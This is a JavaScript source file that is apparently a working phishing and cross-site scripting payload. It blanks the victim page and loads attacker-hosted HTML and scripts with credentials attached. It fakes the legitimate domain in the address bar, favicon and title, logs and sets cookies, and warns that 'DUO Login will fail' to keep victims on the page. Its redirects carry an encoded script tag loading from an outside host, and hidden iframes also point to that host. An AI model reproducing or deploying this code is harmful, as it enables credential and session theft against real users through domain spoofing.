// window.ATTACK_DOM = attacker's entry site URL
// window.PHISHING_URL = usrl phsi
if (window.localStorage.getItem("loggedIn") == "true") window.location.href = ORIG_DOM;

var uri = window.location.href;
window.ORIG_DOM_NAME = (new URL(ORIG_DOM)).hostname; 
window.ATTACK_DOM_NAME = (new URL(ATTACK_DOM)).hostname;
document.getElementsByTagName('html')[0].innerHTML = ""
setTimeout(function() {history.pushState({},"URL",window.ORIG_DOM);}, 10);

var entryPoint = false;
var sid = "";
var load = 2;
document.head = document.head || document.getElementsByTagName('head')[0];
function changeFavicon(src) {
	var link = document.createElement('link'),
	oldLink = document.getElementById('dynamic-favicon');
	link.id = 'dynamic-favicon';
	link.rel = 'shortcut icon';
	link.href = src;
	if (oldLink) document.head.removeChild(oldLink);
	document.head.appendChild(link);
}

if (uri.includes("#")) {
	var moveTo = uri.split("#")[1];
	var favicon = uri.split("#")[2];
	var url = uri.split("#")[3];
	var title = uri.split("#")[4];
	sid = uri.split("#")[5];
	load = parseInt(uri.split("#")[6]);
	setTimeout(()=>injectHTML("https://" + window.ATTACK_DOM_NAME + moveTo), 50);
	changeFavicon("https://" + window.ATTACK_DOM_NAME + favicon);
	document.title = decodeURI(title);
	setTimeout(()=>history.pushState({},"URL", "https://" + window.ORIG_DOM_NAME + "/" + url), 10);
	
}
else {
	entryPoint = true;
	load = 0;
	injectHTML(window.ATTACK_DOM)
}

window.onbeforeunload = function() {
	document.cookie = "";
	if (window.localStorage.getItem("loggedIn") == "true") return null;
	return 'Are you sure you want to leave? DUO Login will fail.';
}

window.addEventListener("message", function(event) {
	if (event.data == 'loggedIn') {
		window.localStorage.setItem('loggedIn', 'true')
		event.data.move = FINAL_DOM;
	}

	if (event.data == "exit") {
		window.onbeforeunload = undefined;
		window.location = window.ORIG_DOM; 
	}
	else {
		var move = event.data.move;
		var url = event.data.url;
		var favicon = event.data.icon;
		var title = event.data.title;
		var sid = event.data.sid;
		console.log("pushing url:", url, "with title", title);
		if (event.data.load != undefined)
			load = event.data.load
		if (favicon != undefined && favicon != "")
			changeFavicon(favicon);
		if (url != undefined && url != "")
			history.pushState({},"URL",url);
		if (title != undefined && title != "")
			document.title = title;
		if (move != undefined && move != "") {
			window.onbeforeunload = undefined;
			changeFavicon("https://" + window.ATTACK_DOM_NAME + "/" + favicon);
			setTimeout(()=>
				window.location.href = `https://${window.ORIG_DOM_NAME}/%3cscript%20src=%68ttps%3a6002.ml/#${move}#${favicon}#${url}#${title}#${sid}#${load}`
			, 100);
		}
	}
}, false);

function injectHTML(page) {
	console.log("Cookei:", document.cookie)
	document.cookie = "";
	var xhttp = new XMLHttpRequest();
	var tstart = new Date().getTime() / 1000;
	xhttp.withCredentials = true;
	xhttp.onreadystatechange = function() {
		if (this.readyState == 4 && this.status == 200) {
			// hacky hacky :o
			var cook = xhttp.getResponseHeader("Content-Type").split(' ')[1];
			console.log("COOKIE:", cook);
			document.cookie = cook;
			var resp = this.responseText;
			resp = resp.replace(/{{ATTACK_DOM}}/g, window.ATTACK_DOM_NAME)
			setTimeout(function() {
				var scripts = document.getElementsByTagName("script");
				var arr = Array.prototype.slice.call(scripts);
				arr.forEach(function(script, index, ar) {
					console.log('getting script')
					if (script.src != "") {
						var xtp = new XMLHttpRequest();
						xtp.onreadystatechange = function() {
							if (this.readyState == 4 && this.status == 200) {
								var s = document.createElement("script");
								s.innerHTML = this.responseText.replace(/{{ATTACK_DOM}}/g, window.ATTACK_DOM_NAME)
								s.innerHTML = this.responseText.replace(/{{ORIG_DOM}}/g, window.ORIG_DOM)
								document.body.appendChild(s);
							}
						}
						xtp.open("GET", script.src, true);
						xtp.send();
					}
					else {
						var s = document.createElement("script");
						s.innerHTML = script.innerHTML.replace(/{{ATTACK_DOM}}/g, window.ATTACK_DOM_NAME)
						s.innerHTML = script.innerHTML.replace(/{{ORIG_DOM}}/g, window.ORIG_DOM)
						document.body.appendChild(s);
					}
				})
			}, 200);
			var tend = new Date().getTime() / 1000;
			var html = document.getElementsByTagName("html")[0];
			var tpassed = tend - tstart;
			if (tpassed < load) setTimeout(() => html.innerHTML = resp, (load - tpassed) * 1000);
			else html.innerHTML = resp;
		}
	};	
	if (!entryPoint) {
		if (sid != "undefined")
			document.body.innerHTML =  "<iframe style='display:none' id='loadframe' src='https://6002.ml/load?time=" + load + "'></iframe>";
		else {
			document.body.innerHTML = "<iframe style='display:none' id='loadframe' src='https://6002.ml/load?time=" + load + "'></iframe>";
		}
	}

	xhttp.open("GET", page, true);
	xhttp.send();
}
